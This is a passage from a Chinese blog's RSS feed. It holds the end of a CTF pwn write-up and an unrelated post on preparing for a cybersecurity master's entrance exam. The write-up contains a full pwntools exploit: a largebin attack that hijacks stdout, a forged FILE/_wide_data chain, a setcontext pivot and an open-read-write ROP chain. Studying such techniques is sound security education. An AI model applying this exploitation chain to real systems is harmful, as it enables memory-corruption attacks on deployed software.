class="built_in">puts</span>(<span class="string">&quot;Invalid idx&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = chunk_list[v1];</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Content&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, chunk_list[v1], size_list[v1]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SHOW：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_14B9</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;idx&quot;</span>);</span><br><span class="line">  v1 = input_number();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0xA</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid idx&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = chunk_list[v1];</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(chunk_list[v1]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. 申请一系列的largebin大小的堆，释放一个进入unsorted bin，泄露出libc_base，申请一个比unsorted bin中堆块大的chunk，则unsorted bin中的free_chunk进入large bin，泄露出heap_base</span><br><span class="line">2. 修改largebin中的堆块，使其bk_nextsize指向stdout-0x20</span><br><span class="line">3. 释放idx为1的堆块进入unsorted bin，利用idx为0的堆块构造idx为1堆块的prev_size为0x8000</span><br><span class="line">4. 申请一个比unsorted bin大的chunk，造成largebin attack，劫持stdout</span><br><span class="line">5. 利用puts触发链子，达到orw</span><br><span class="line"></span><br><span class="line"> ► f 0   0x7f5d6e683c14 _IO_wdoallocbuf+36</span><br><span class="line">   f 1   0x7f5d6e686675 _IO_wfile_overflow+613</span><br><span class="line">   f 2   0x7f5d6e680f9c puts+204</span><br></pre></td></tr></table></figure><h4 id="调试信息-1"><a href="#调试信息-1" class="headerlink" title="调试信息"></a>调试信息</h4><p>劫持<code>stdout</code>为目标堆：</p><p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309012032769.png" alt="image-20230901203218606"></p><p>目标堆即<code>fake_IO_2_1_stdout_</code>结构体如下：</p><p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309012037074.png" alt="image-20230901203730853"></p><p>伪造的<code>_wide_data</code>结构体如下：</p><p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309012041239.png" alt="image-20230901204104152"></p><p>伪造的<code>_wide_vtable</code>结构体如下：</p><p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309012043352.png" alt="image-20230901204349224"></p><p>最后通过<code>puts</code>触发如下链子：</p><p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309012047350.png" alt="image-20230901204737269"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">► f 0   0x7f840de83c14 _IO_wdoallocbuf+36</span><br><span class="line">  f 1   0x7f840de86675 _IO_wfile_overflow+613</span><br><span class="line">  f 2   0x7f840de80f9c puts+204</span><br><span class="line">  f 3   0x560d95ab0344</span><br><span class="line">  f 4   0x560d95ab076a</span><br><span class="line">  f 5   0x7f840de29d90 __libc_start_call_main+128</span><br><span class="line">  f 6   0x7f840de29e40 __libc_start_main+128</span><br><span class="line">  f 7   0x560d95ab01ae</span><br></pre></td></tr></table></figure><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Size:\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Please input the content\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;idx:\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;idx:\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Content\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;idx\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)  <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x410</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)  <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x410</span>, <span class="string">b&#x27;c&#x27;</span>*<span class="number">8</span>)  <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x420</span>, <span class="string">b&#x27;d&#x27;</span>*<span class="number">8</span>)  <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x420</span>, <span class="string">b&#x27;e&#x27;</span>*<span class="number">8</span>)  <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x7f3936a19ce0</span> - <span class="number">0x7f3936800000</span></span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - offset</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x430</span>, <span class="string">b&#x27;f&#x27;</span>*<span class="number">8</span>)    <span class="comment">#5</span></span><br><span class="line">edit(<span class="number">3</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span> + <span class="string">b&#x27;anza&#x27;</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;anza&#x27;</span>)</span><br><span class="line">heap_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0xef0</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base===&gt;&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">l_main = libc_base + <span class="number">0x219cd0</span></span><br><span class="line">stdout = libc_base + libc.sym[<span class="string">&quot;stdout&quot;</span>]</span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">pop_rdx_r12_ret = libc_base + <span class="number">0x000000000011f497</span></span><br><span class="line">ret = libc_base + <span class="number">0x0000000000029cd6</span></span><br><span class="line">open_addr = libc_base + libc.sym[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">read_addr = libc_base + libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write_addr = libc_base + libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">edit(<span class="number">3</span>, p64(l_main)*<span class="number">2</span> + p64(heap_base+<span class="number">0xef0</span>) + p64(stdout - <span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[<span class="string">&quot;_IO_wfile_jumps&quot;</span>]</span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&quot;setcontext&quot;</span>]</span><br><span class="line">fake_IO_stdout_addr = heap_base + <span class="number">0x6b0</span></span><br><span class="line">fake_IO_stdout = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">fake_IO_stdout = fake_IO_stdout.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(fake_IO_stdout_addr + <span class="number">0xe0</span>)</span><br><span class="line">fake_IO_stdout = fake_IO_stdout.ljust(<span class="number">0xb0</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_stdout = fake_IO_stdout.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(_IO_wfile_jumps - <span class="number">0x20</span>)</span><br><span class="line">fake_IO_stdout = fake_IO_stdout.ljust(<span class="number">0x170</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(heap_base + <span class="number">0x2b0</span>) + p64(ret)</span><br><span class="line">fake_IO_stdout = fake_IO_stdout.ljust(<span class="number">0xd0</span> + <span class="number">0xe0</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(fake_IO_stdout_addr + <span class="number">0xe0</span> + <span class="number">0xf0</span>)</span><br><span class="line">fake_IO_stdout = fake_IO_stdout.ljust(<span class="number">0xe0</span> + <span class="number">0xf0</span> + <span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(setcontext + <span class="number">61</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, fake_IO_stdout)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># add(0x430, b&#x27;g&#x27;*8)</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x410</span>*<span class="string">b&quot;a&quot;</span> + p64(<span class="number">0x8000</span>))</span><br><span class="line"></span><br><span class="line">orw_addr = heap_base + <span class="number">0x2b0</span></span><br><span class="line">flag_addr = heap_base + <span class="number">0x1760</span></span><br><span class="line">orw = p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">orw += p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(open_addr)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_r12_ret) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(read_addr)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_r12_ret) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(write_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, orw)</span><br><span class="line">edit(<span class="number">5</span>, <span class="string">b&#x27;./flag\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Size:\n&quot;</span>, <span class="built_in">str</span>(<span class="number">0x430</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录一些堆题的练习。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>双非一战上岸武汉大学网安专硕</title>
    <link href="http://example.com/2023/04/03/hznu2whu/"/>
    <id>http://example.com/2023/04/03/hznu2whu/</id>
    <published>2023-04-03T06:35:48.000Z</published>
    <updated>2023-04-07T07:12:33.976Z</updated>
    
    <content type="html"><![CDATA[<img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202304042018896.png" alt="image-20230404201805060" style="zoom: 25%;" /><span id="more"></span><h2 id="个人情况"><a href="#个人情况" class="headerlink" title="个人情况"></a>个人情况</h2><p>本人就读于杭州某所双非院校，本科专业为计算机（金融方向），初试成绩 392（69+84+129+110）。</p><p>报考武大网安一方面是因为自己对本科专业方向不是很感兴趣，另一方面作为一名 CTFer 小透明，在我院的网安实验室里做出了点成绩，想去更高的平台看看大佬。</p><p>择校过程：暨南大学网安专 =&gt; 厦门大学计专 =&gt; 武汉大学网安专。</p><p>选择暨大是因为它们网安发展似乎挺不错的，CTF 战队也很牛，而且只考一门数据结构，后期 F*cking 408 学不下去了就直接转；然后想冲厦大一方面是因为 408 算是学下去了，另一方面有个做二进制安全很牛的老师在计院（也图厦大的美丽，但非本部校区）；再后来，厦大招生名单一出，人数砍半，而武大网安那边传来消息说保研选手鸽了好多，名额都腾出来给统招了，遂冲（武大也美，但也非本部校区😭）。</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202304042052686.jpg" alt="img" style="zoom: 25%;" /><h2 id="初试规划"><a href="#初试规划" class="headerlink" title="初试规划"></a>初试规划</h2><p>武大网安专硕的考试科目为：政治，英语二，数学二，408计算机专业基础。</p><p>鉴于数学、专业课基础比较薄弱，本人从 2022 年一月就开始准备，实际上三月开始准备也完全赶得上。</p><h3 id="政治"><a href="#政治" class="headerlink" title="政治"></a>政治</h3><p>政治无需太早准备，大部分考点（尤其毛中特和史纲）都结合了<strong>时事</strong>，后期会有很多名师帮你整理。</p><p>我是 9 月开始准备政治的，用的参考书为《肖秀荣——知识点精讲精练》和《1000题》，听的是腿姐的基础班，听一章做一章《1000》题（分析题不做），然后跟的也是腿姐的强化班和技巧班，腿姐有对<strong>关键词</strong>做整理，对我厘清知识框架挺有帮助的，技巧班就见仁见智吧，似乎今年有很多人栽在这上面了，但我个人觉得还行。反正就在那几个考研风评不错的政治老师里跟紧一个就对了，政治分数差别不大。</p><p>后期押题卷我只参考了<strong>肖四肖八</strong>，肖八考前一个月会有，肖四考前两周会有，个人认为背诵的优先级：肖四全卷 &gt; 肖八的选择题 &gt; 肖八的分析题。押题卷不一定能囊括所有题目，主要就是巩固知识点和学习话术用的，多背总没错，最后几天自己最好能总结一套分析题的写法。闲着的时候可以在小程序上刷刷习题册或者押题卷。</p><p>由于本人没有复核，参考网上还算权威的答案，估摸着客观38 + 主观31。</p><h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><p>本人英语基础还行，四六级 550+，在考研过程中花在英语上的时间比较少，所以可能不太适合做参考。</p><p>本人用的某贝单词 APP，每天早上起来吃饭的时候只背了 30 个新单词 + 复习 90 个旧单词，然后刷一篇英一或英二的真题完型或者阅读。作文参考王江涛的作文书，有些文章写的确实不错，但也有文章写的比较模板化，最好拿来自己改改，当然如果只想拿个一般分的话直接网上找些模板背就行了。但就群里兄弟们的发言来看，湖北英语作文高低分差得蛮大的，有时间还是要多准备下。</p><p>建议可以在四六级考试前集中几天准备下作文，然后在四六级考试上模拟下，顺便刷个分。本人考研期间考了两次六级，写作/翻译都达到了 185+。</p><p>总的来说，我认为考研英语抓准<strong>单词+真题精读</strong>就够了，英语的学习是<strong>积累+语感培养</strong>的过程，顺便记得把字练好。</p><p>由于本人没有复核，参考网上还算权威的答案，估摸着客观55 + 主观29。</p><h3 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h3><p>由于本人高考数学炸了，且大学里高数和线代学得也比较差，对数学一直心有余悸，因此在 1 月开始准备。</p><p>基础阶段：起初我跟的是汤家凤的零基础班，主要是重温一些基础概念，边看边做一些笔记，到 3 月多才看完。然后 4 月左右开始跟武忠祥的基础课，以高数为主，期间使用的习题册是汤家凤的《1800》题，只写了基础篇，基本上是看一章写一章，有些看不太懂的答案思路会拍下来，在吃饭路上思考，很多时候自然就想通了。在 6 月底前也就是暑假开始前，跟完<strong>武忠祥高数</strong>和<strong>李永乐线代</strong>的基础班，刷完了《1800》的基础篇，算是基本了解了高数/线代基础考点。</p><p>强化阶段：7 月暑假留校，开启强化阶段。跟的是武忠祥的高数强化课和李永乐的线代强化课，习题册只用了<strong>《660》</strong>和<strong>《880》</strong>，跟以往思路一样，也是看一章做一章，做完之后整个人都通透了很多，大概到 9 月中旬刷完了这两本习题册。</p><p>刷题巩固阶段：接着开始刷数学历年真题，从 1987 开始，一天刷一份（早期的比较简单，可以一天刷两份），150 分的卷只给自己计时 2 个小时 30 分钟，早上刷完回去午睡，然后下午回来订正。如果没有太多时间或者基础比较好的话，真题可以直接从 2008 年开始刷。大概 11 月左右各大名师的预测卷都要出好了，我使用的是<strong>张宇8+4</strong> 和<strong>李林6+4</strong>，也是一天刷一份。张宇卷写得我想哭，分差极大，要么写得特别好，要么动不动 90+，李林还好，基本都有 110+。但预测卷完全说明不了什么，不要太焦虑了，主要拿来查漏补缺用的，但要<strong>坚持做保持手感</strong>。有些题目不懂可以去 bilibili 找一些大佬 up 主的视频看看，个人比较推荐：没咋了。</p><p>总的来说，数学的每个阶段都很重要，是需要每天花大把时间的，我主要前中期花的时间比较多，白天上下午都拿来复习数学，然后后期刷题阶段就是早上刷一套数学卷子，下午花一个小时不到的时间纠错，纠错完后的时间给政治和英语。对于名师的选择，张宇和武忠祥都可以吧，身边研友都说挺不错的，但最后还得是靠自己。</p><p>ps. 最后考试的时候数学选择只算了一遍，选项分布 1 3 3 3，让我有点害怕，但我还是坚持第一感觉，心理想着顶多错一道，稳一点，最后选择全对，但填空题第一题就错了，让我很无语，所以<strong>简单题有时间得多验算</strong>😭。看到大题的时候有点点懵，感觉不像往常的题型，但做下去发现也只是套了层皮，也基本一遍过，除了证明题第二问基本都写出来了。</p><p>由于本人没有复核，参考网上还算权威的答案，估摸着客观70 + 主观59。</p><h3 id="408计算机专业基础"><a href="#408计算机专业基础" class="headerlink" title="408计算机专业基础"></a>408计算机专业基础</h3><p>虽是科班，但没上过计组和操作系统的课程。不过有二进制安全学习经历，学起来不算太累。考研期间，我一般把晚上 4 个小时左右的时间拿来复习 408。</p><p>学 408 要<strong>反复多次</strong>，参考书用<strong>王道</strong>就够了。我 3 月开始跟王道的基础课，看课顺序是数据结构、计组、操作系统、计网，听一章课做一章课的课后习题，听的过程中可以做些简单的笔记，可以做在书上，也可以做在另外的笔记本上。我大概是 6 月多听完第一遍后，发现很多之前的概念都会忘掉了。这是正常的，408 内容比较多，看到第二遍第三遍回忆得会越来越来快。</p><p>我 6 月后也就是暑假期间又细听了一遍基础课，一些算法过程、PV 操作都跟着在纸上模拟了一遍，另外做了厚厚的六本笔记本，最后自己整理的时候也还算是有用。（但笔记做得太冗杂了，而且时间成本高，精简点会好些）</p><p>9 月开始会比较迷茫，感觉很多都学了，选择题能做，但试卷大题还是不会，这个时候就可以开始跟王道的强化课（很重要，可以更早开始！！），强化课主要对<strong>常见考点</strong>做了梳理，会花几个课时帮你理解一个知识分支，也会教一些答题技巧。10 月开始就是刷真题，<strong>真题特别特别重要，因为知识点会反复考！！！！</strong>我是每天晚上计时做一张，然后放到第二天下午和数学一起校对。有时间的话真题一定要多过几轮，我第一轮是自己写一遍，第二轮就是看一题校对一题，要把每个选择题选项都搞清楚，大题把几个常见算法、PV 操作都多默写几遍。有空可以再写一遍王道课后习题，查漏补缺，把一些陌生的知识点记录在下来，主打一个<strong>反复多次</strong>。</p><p>总的来说，学 408 的过程一定要有<strong>耐心</strong>，有很长一段时间我都会觉得自己好像啥也没学懂，但到了后期强化、刷卷阶段会发现都是那几个知识点在反复考，所以有很大一部分分数努努力就能拿到。  </p><p>ps. 今年死在数据结构上了，光数据结构选择就错了 5 个，其他每门选择都只错 1 个，数据结构第二大题外部排序算法思想没想起来，就对了第二小问，操作系统有一大题排序的也纠结了很久。校对完答案一直觉得自己只有 100 分左右，担心了好久😭，好在最后结果还不错。</p><p>由于本人没有复核，参考网上还算权威的答案，估摸着客观64 + 主观46。</p><h2 id="复试规划"><a href="#复试规划" class="headerlink" title="复试规划"></a>复试规划</h2><p>武安复试包括笔试和综合面试（主要是英语面试和专业面试）。</p><p>基本问题之前有学长总结过：<a href="https://blog.wangx.wang/index.php/archives/171/">关于武大网安复试的一些QA</a>，由于不能透露具体内容，就简单讲讲如何准备的。</p><h3 id="笔试"><a href="#笔试" class="headerlink" title="笔试"></a>笔试</h3><p>参考书目：《信息系统安全概论》，石文昌著。第二第三版都可以。</p><p>考察的课内知识比较基础，从<strong>概念、优缺点、实现方法、例子</strong>这几个角度整理即可。</p><p>有涉及一些课外的知识，但问得也很开放。</p><p>ps. 最后写得满满当当，拿了个 80 平均分。</p><h3 id="面试"><a href="#面试" class="headerlink" title="面试"></a>面试</h3><p>复试英语参考文章：<a href="http://www.cskaoyan.com/forum.php?mod=viewthread&tid=654288&highlight=%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD">19武大网安英语口语准备资料及一点个人体会</a></p><p>英语面试：参考上面的文章准备了将近十来个日常问题，最后也押中了两个，最好也准备下专业问题。英语面试过程中，感觉考官更注重<strong>口语的流畅度和逻辑</strong>，而非口语内容，所以无需太多高级词汇。</p><p>专业面试：可以交<strong>简历</strong>，也建议有竞赛、项目、论文的同学交简历，前提是要清楚自己工作的部分。<strong>毕设</strong>也要好好准备一下，如果是跟安全有关的，老师很可能会问。</p><p>ps. 我在面试前头脑一片空白，紧张得自我介绍也背不顺了😭，就索性放空自己🤯，面试的时候就是想到啥说啥，缝合了好多个提前准备的回答。老师们也都很和蔼，许多深入的方向也没有追问，时间很快就过去啦~</p><p>最终本人复试成绩意料之外地位于小组第一，属实受宠若惊😭，感谢各位老师抬爱。</p><h2 id="个人心得与致谢"><a href="#个人心得与致谢" class="headerlink" title="个人心得与致谢"></a>个人心得与致谢</h2><h3 id="个人心得"><a href="#个人心得" class="headerlink" title="个人心得"></a>个人心得</h3><ul><li>考研择校很重要，但也不用太早就敲定要考某个学校，后期根据自身情况和招生方案再做抉择也不迟。如果只是想图个 211 学历，可以选农林、财经、师范类的高校的一些计算机交叉专业。</li><li>如果考计算机方向的专业，优先准备 408，408 是大势所趋，而且在我看来也是科班学生应当具备的知识基础。</li><li>IT 专业考研难度一般是：计算机 &gt; 软工 ≈ 网安 ≈ 人工智能。但近几年大家似乎都太过求稳了，今年扩招的武大网安专硕划线 355，缩招的武大计科专硕划线 360，缩招的厦大计科专硕划线 350，而且福建还是水区，只能说被劝退的人不少。另外，刚改考 408 的南理工好像也炸了，就连双非也炸得离谱，考我们本校 22408 的软工专硕居然能有 391 的考生，只能说太卷辣！</li></ul><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202304052028047.png" alt="image-20230405202822686" style="zoom: 33%;" /><ul><li>可以通过目标院校的考研群收集资料，一般来说王道的群成员人数多一些。招生信息出后，群里就会开始“引流”和“劝退”，就像我原本在厦大计科群，被引到了武大网安群。其次，切勿水群，十月确认院校后把其他院校的群退了。</li><li>警惕 B乎 匿名用户打心态牌，动不动“小道消息”、“内部消息”、“今年爆炸”，给他点个👎看他还发不发电！</li><li>按照自己最好的状态学，不必跟上别人的节奏。像我的学习时间一般是早上：9 ~ 12，下午：14 ~ 17，晚：18 ~ 22。偶尔也会摸🐟，打打游戏什么的，但打完记得卸掉（瘾犯了下回来后，打完再卸），现在对游戏已无感？</li><li>和研友们定期约个饭，打卡周边一些美食店，释放考研压力。</li></ul><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202304052118011.png" alt="image-20230405211807371" style="zoom: 40%;" /><h3 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h3><p>感谢老爸老妈因为担心我的复试情况跑来武汉为我分担压力（<del>虽然两天后因为水土不服就回去了）</del>，感谢老姐滴支持。</p><p>感谢刘老师、实验室里的学长学姐还有一起打比赛的师傅们，特别感谢 <strong>@j1ang</strong> &amp; <strong>@4XWi11</strong> &amp; <strong>@scr1pt</strong>，带着我这个菜鸡混了好多奖😭。</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202304052134673.png" alt="image-20230405213418516" style="zoom:40%;" /><p>感谢 <strong>@verf1sh</strong> 师傅和 <strong>@tty</strong> 师傅，在我学习二进制的过程中给了我很多启发。</p><p>感谢 HZNU，感谢我的饭友们，再次感谢所有关心、鼓励、支持我的家人和朋友们。</p><p>最后感谢努力了一年的自己🙂。</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202304052158276.jpg" alt="img" style="zoom: 50%;" />]]></content>
    
    
    <summary type="html">&lt;img src=&quot;https://anza.oss-cn-hangzhou.aliyuncs.com/img/202304042018896.png&quot; alt=&quot;image-20230404201805060&quot; style=&quot;zoom: 25%;&quot; /&gt;</summary>
    
    
    
    <category term="other" scheme="http://example.com/categories/other/"/>
    
    
  </entry>
  
  <entry>
    <title>技巧总结</title>
    <link href="http://example.com/2023/02/01/tricks/"/>
    <id>http://example.com/2023/02/01/tricks/</id>
    <published>2023-02-01T14:26:10.000Z</published>
    <updated>2023-09-17T03:52:24.035Z</updated>
    
